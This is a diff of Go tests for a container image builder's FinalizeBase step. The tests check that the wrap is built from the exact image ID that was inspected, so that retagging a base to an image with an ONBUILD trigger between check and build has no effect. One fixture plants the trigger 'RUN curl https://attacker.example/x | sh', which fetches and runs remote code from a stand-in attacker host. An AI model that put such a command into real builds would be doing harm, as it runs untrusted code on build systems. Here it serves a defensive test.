@@ -75,7 +75,7 @@ func TestBuild_ReturnsTheStreamIDAndKeepsItsTagFrom(t *testing.T) {
 	}
 }
 
-func TestFinalizeBase_WrapsByDigestWhenTheBaseHasOne(t *testing.T) {
+func TestFinalizeBase_WrapsByIDAndRecordsTheDigest(t *testing.T) {
 	f := newFakeEnvbuilderDocker()
 	f.imagesPresent["ubuntu:24.04"] = true
 	f.repoDigests = map[string][]string{"ubuntu:24.04": {"other/img@" + testOtherDigest, "ubuntu@" + testBaseDigest}}
@@ -86,18 +86,26 @@ func TestFinalizeBase_WrapsByDigestWhenTheBaseHasOne(t *testing.T) {
 	if err != nil {
 		t.Fatalf("FinalizeBase: %v", err)
 	}
-	if !strings.HasPrefix(f.lastDockerfile, "FROM ubuntu@"+testBaseDigest+"\n") {
-		t.Fatalf("wrap Dockerfile = %q, want FROM ubuntu@%s", f.lastDockerfile, testBaseDigest)
+	if want := "FROM " + fakeImageID("ubuntu:24.04") + "\n"; !strings.HasPrefix(f.lastDockerfile, want) {
+		t.Fatalf("wrap Dockerfile = %q, want %q", f.lastDockerfile, want)
 	}
 	if built.BaseDigest != testBaseDigest {
 		t.Fatalf("BaseDigest = %q, want %q", built.BaseDigest, testBaseDigest)
 	}
 }
 
-func TestFinalizeBase_WrapsByRefWhenTheBaseHasNoDigest(t *testing.T) {
+// The wrap builds FROM the image its ONBUILD check inspected: a refresh that moves the shared tag to another
+// image (here one with a trigger) between that check and the build changes nothing the build runs. A daemon
+// that reports no image ID fails the wrap before any build.
+func TestFinalizeBase_WrapsTheImageItInspected(t *testing.T) {
 	f := newFakeEnvbuilderDocker()
 	f.imagesPresent["myco/dev:latest"] = true
 	f.repoDigests = map[string][]string{"myco/dev:latest": {"unrelated/repo@" + testBaseDigest}}
+	f.imageIDs, f.onBuild = map[string]string{}, map[string][]string{}
+	f.beforeBuild = func() {
+		f.imageIDs["myco/dev:latest"] = fakeImageID("refreshed")
+		f.onBuild["myco/dev:latest"] = []string{"RUN curl https://attacker.example/x | sh"}
+	}
 	b := newWithClient(f, "envbuilder:test", "")
 	b.ToolsDir = toolsDirWithRequired(t)
 
@@ -105,8 +113,20 @@ func TestFinalizeBase_WrapsByRefWhenTheBaseHasNoDigest(t *testing.T) {
 	if err != nil {
 		t.Fatalf("FinalizeBase: %v", err)
 	}
-	if !strings.HasPrefix(f.lastDockerfile, "FROM myco/dev:latest\n") || built.BaseDigest != "" {
-		t.Fatalf("local-only base: Dockerfile %q, BaseDigest %q; want FROM the ref and no digest", f.lastDockerfile, built.BaseDigest)
+	from, _, _ := strings.Cut(strings.TrimPrefix(f.lastDockerfile, "FROM "), "\n")
+	if got := f.imageIDFor(from); got != fakeImageID("myco/dev:latest") || built.BaseDigest != "" {
+		t.Fatalf("the wrap's FROM %q names image %s after the tag moved, BaseDigest %q; want the inspected %s and no digest",
+			from, got, built.BaseDigest, fakeImageID("myco/dev:latest"))
+	}
+
+	g := newFakeEnvbuilderDocker()
+	g.imagesPresent["myco/odd:1"] = true
+	g.imageIDs = map[string]string{"myco/odd:1": "myco/odd:1"}
+	b = newWithClient(g, "envbuilder:test", "")
+	b.ToolsDir = toolsDirWithRequired(t)
+	if _, err := b.FinalizeBase(context.Background(), "myco/odd:1", "wardyn-byoi/run-odd:latest", nil, false); err == nil ||
+		!strings.Contains(err.Error(), "cannot be bound to the image checked") || g.imageBuildCalled {
+		t.Fatalf("a base with no image ID: err = %v, built = %v; want a refusal before any build", err, g.imageBuildCalled)
 	}
 }
 
